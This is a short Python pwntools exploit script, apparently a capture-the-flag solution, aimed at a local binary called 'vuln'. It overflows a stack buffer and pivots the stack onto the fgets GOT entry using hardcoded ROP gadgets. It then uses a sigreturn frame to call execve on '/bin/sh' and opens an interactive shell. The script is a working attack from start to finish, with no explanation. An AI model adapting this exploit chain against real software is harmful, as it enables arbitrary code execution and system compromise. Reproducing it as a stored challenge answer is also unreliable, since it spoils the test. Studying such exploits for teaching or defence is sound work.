from pwn import *

elf = ELF("./vuln")
context.arch = "amd64"

p = process(elf.path)


#0x000000000040111d : pop rbp ;ret 
#0x000000000040115b : leave ; ret

pop_rbp = 0x000000000040111d
leave   = 0x000000000040115b
writable= 0x0000000000404000+0xff
syscall = 0x0000000000401198

payload = b"A"*16
payload += p64(pop_rbp)
payload += p64(elf.got["fgets"]-0x10)
payload += p64(0x0000000000401142)




pause()
p.sendline(payload)


frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = elf.got["fgets"] + 10
frame.rsi = 0
frame.rdx = 0


payload2 = b"/bin/sh\0"
payload2 += p64(elf.got["fgets"]+16)
payload2  += p64(0x0000000000401142)
payload2 += p64(elf.sym["printfile"])
payload2 += b"a\0"
payload2 += b"/bin/sh\0".ljust(14, b"\0") # Junk
payload2 += p64(syscall)
payload2 += bytes(frame)

p.sendline(payload2)


p.interactive()
